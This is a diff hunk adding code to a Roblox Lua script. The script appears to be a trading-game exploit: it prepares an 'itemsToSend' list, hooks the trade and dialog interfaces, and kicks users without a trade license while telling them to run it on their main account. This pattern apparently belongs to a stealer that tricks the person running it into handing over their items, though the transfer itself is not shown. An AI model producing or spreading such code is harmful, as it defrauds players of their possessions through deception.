@@ -36,6 +36,19 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
+local itemsToSend = {}
+local inTrade = false
+local playerGui = plr:WaitForChild("PlayerGui")
+local tradeFrame = playerGui.TradeApp.Frame
+local dialog = playerGui.DialogApp.Dialog
+local toolApp = playerGui.ToolApp.Frame
+local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)
+
+if not tradeLicense.player_has_trade_license() then
+    plr:kick("This script wont work on an alt account. Please use your main account")
+    return
+end
+
 local HttpService = game:GetService("HttpService")
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local RouterClient = Loads("RouterClient")
